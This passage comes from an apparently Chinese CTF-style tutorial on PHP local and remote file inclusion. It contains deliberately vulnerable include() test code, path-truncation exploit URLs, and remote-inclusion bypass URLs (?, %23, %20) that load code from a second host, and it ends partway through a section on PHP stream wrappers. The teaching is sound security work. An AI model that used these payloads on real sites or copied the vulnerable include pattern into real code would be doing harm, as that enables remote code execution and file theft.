+&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token variable&#34;&gt;$filename&lt;/span&gt;  &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;filename&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;include&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$filename&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;.html&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token delimiter important&#34;&gt;?&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;div class=&#34;tab&#34; data-id=&#34;id1&#34; data-title=&#34;EXP:&#34;&gt;
+&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy5jdGZzLXdpa2kuY29tL0ZJL0ZJLnBocD9maWxlbmFtZT10ZXN0LnR4dC8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8=&#34;&gt;http://www.ctfs-wiki.com/FI/FI.php?filename=test.txt/./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././&lt;/span&gt;&lt;/p&gt;
+&lt;/div&gt;
+&lt;p&gt;&lt;img data-src=&#34;image008.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;h3 id=&#34;点号截断&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#点号截断&#34;&gt;#&lt;/a&gt; 点号截断&lt;/h3&gt;
+&lt;p&gt;条件：windows OS，点号需要长于 256&lt;/p&gt;
+&lt;p&gt;测试代码：&lt;/p&gt;
+&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token variable&#34;&gt;$filename&lt;/span&gt;  &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;filename&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;include&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$filename&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;.html&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token delimiter important&#34;&gt;?&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;div class=&#34;tab&#34; data-id=&#34;id2&#34; data-title=&#34;EXP:&#34;&gt;
+&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy5jdGZzLXdpa2kuY29tL0ZJL0ZJLnBocD9maWxlbmFtZT10ZXN0LnR4dA==&#34;&gt;http://www.ctfs-wiki.com/FI/FI.php?filename=test.txt&lt;/span&gt;.................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................&lt;/p&gt;
+&lt;/div&gt;
+&lt;h1 id=&#34;远程文件包含&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#远程文件包含&#34;&gt;#&lt;/a&gt; 远程文件包含&lt;/h1&gt;
+&lt;p&gt;PHP 的配置文件 allow_url_fopen 和 allow_url_include 设置为 ON，include/require 等包含函数可以加载远程文件，如果远程文件没经过严格的过滤，导致了执行恶意文件的代码，这就是远程文件包含漏洞。&lt;/p&gt;
+&lt;div class=&#34;note info&#34;&gt;
+&lt;p&gt;allow_url_fopen = On（是否允许打开远程文件）&lt;br /&gt;
+allow_url_include = On（是否允许 include/require 远程文件）&lt;/p&gt;
+&lt;/div&gt;
+&lt;h2 id=&#34;无限制远程文件包含&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#无限制远程文件包含&#34;&gt;#&lt;/a&gt; 无限制远程文件包含&lt;/h2&gt;
+&lt;p&gt;和无限制本地文件包含差不多。不再介绍（懒蛋。。）&lt;br /&gt;
+&lt;img data-src=&#34;image009.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;有限制远程文件包含&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#有限制远程文件包含&#34;&gt;#&lt;/a&gt; 有限制远程文件包含&lt;/h2&gt;
+&lt;p&gt;测试代码：&lt;/p&gt;
+&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;include&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;filename&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;.html&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token delimiter important&#34;&gt;?&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;代码中多添加了 html 后缀，导致远程包含的文件也会多一个 html 后缀。&lt;/p&gt;
+&lt;h3 id=&#34;绕过姿势&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#绕过姿势&#34;&gt;#&lt;/a&gt; 绕过姿势&lt;/h3&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;问号绕过&lt;br /&gt;
+ &lt;code&gt;http://192.168.199.130/test.php?filename=http://192.168.199.131/php.txt?&lt;/code&gt; &lt;br /&gt;
+&lt;img data-src=&#34;image012.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;#号绕过&lt;br /&gt;
+ &lt;code&gt;http://192.168.199.130/test.php?filename=http://192.168.199.131/php.txt%23&lt;/code&gt; &lt;br /&gt;
+&lt;img data-src=&#34;image011.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;空格 (%20) 绕过&lt;br /&gt;
+ &lt;code&gt;http://192.168.199.130/test.php?filename=http://192.168.199.131/php.txt%20&lt;/code&gt; &lt;br /&gt;
+&lt;img data-src=&#34;image010.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h1 id=&#34;php伪协议&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#php伪协议&#34;&gt;#&lt;/a&gt; PHP 伪协议&lt;/h1&gt;
+&lt;p&gt;PHP 带有很多内置 URL 风格的封装协议，可用于类似 fopen ()、 copy ()、 file_exists () 和 filesize () 的文件系统函数。 除了这些封装协议，还能通过 stream_wrapper_register () 来注册自定义的封装协议。&lt;/p&gt;
+&lt;p&gt;支持的种类有这 12 种&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;file:// — 访问本地文件系统&lt;/li&gt;
+&lt;li&gt;http:// — 访问 HTTP (s) 网址&lt;/li&gt;
+&lt;li&gt;ftp:// — 访问 FTP (s) URLs&lt;/li&gt;
+&lt;li&gt;php:// — 访问各个输入 / 输出流（I/O streams）&lt;/li&gt;
+&lt;li&gt;zlib:// — 压缩流&lt;/li&gt;
+&lt;li&gt;data:// — 数据（RFC 2397）&lt;/li&gt;
+&lt;li&gt;glob:// — 查找匹配的文件路径模式&lt;/li&gt;
+&lt;li&gt;phar:// — PHP 归档&lt;/li&gt;
+&lt;li&gt;ssh2:// — Secure Shell 2&lt;/li&gt;
+&lt;li&gt;rar:// — RAR&lt;/li&gt;
+&lt;li&gt;ogg:// — 音频流&lt;/li&gt;
+&lt;li&gt;expect:// — 处理交互式的流&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;php-输入输出流&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#php-输入输出流&#34;&gt;#&lt;/a&gt; php:// 输入输出流&lt;/h2&gt;
+&lt;p&gt;PHP 提供了一些杂项输入 / 输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符， 内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。&lt;/p&gt;
+&lt;h2 id=&#34;phpstdin-phpstdout-和-phpstderr&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#phpstdin-phpstdout-和-phpstderr&#34;&gt;#&lt;/a&gt; php://stdin, php://stdout 和 php://stderr&lt;/h2&gt;
+&lt;p&gt;php://stdin、php://stdout 和 php://stderr 允许直接访问 PHP 进程相应的输入或者输出流。 数据流引用了复制的文件描述符，所以如果你打开 php://stdin 并在之后关了它， 仅是关闭了复制品，真正被引用的 STDIN 并不受影响。 推荐简单使用常量 STDIN、 STDOUT 和 STDERR 来代替手工打开这些封装器。&lt;/p&gt;
+&lt;p&gt;&lt;span class=&#34;label warning&#34;&gt;php://stdin 是只读的，php://stdout 和 php://stderr 是只写的。&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span class=&#34;label success&#34;&gt;📣举例&lt;/span&gt;&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;span class=&#34;label info&#34;&gt;php://stdin&lt;/span&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;while&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$line&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;fopen&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;php://stdin&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;r&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;//open our file pointer to read from stdin&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$line&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;\n&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;fgets&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$line&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;// 读取&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token delimiter important&#34;&gt;?&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;image018.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;可以看到打开了一个文件指针进行读取&lt;/p&gt;
+&lt;ol start=&#34;2&#34;&gt;
+&lt;li&gt;&lt;span class=&#34;label info&#34;&gt;php://stdout&lt;/span&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token variable&#34;&gt;$fd&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;fopen&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;php://stdout&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;w&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$fd&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$fd&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;\n&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token function&#34;&gt;fwrite&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$fd&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;这是一个测试&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token function&#34;&gt;fwrite&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$fd&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;\n&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token function&#34;&gt;fclose&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$fd&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token delimiter important&#34;&gt;?&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;image019.png&#34; alt=&#34;&#34; /&gt;&lt;br /&gt;
+可以看到打开了一个文件指针进行写入&lt;/p&gt;
+&lt;ol start=&#34;3&#34;&gt;
+&lt;li&gt;&lt;span class=&#34;label info&#34;&gt;php://stderr&lt;/span&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token variable&#34;&gt;$stderr&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;fopen&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;php://stderr&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; 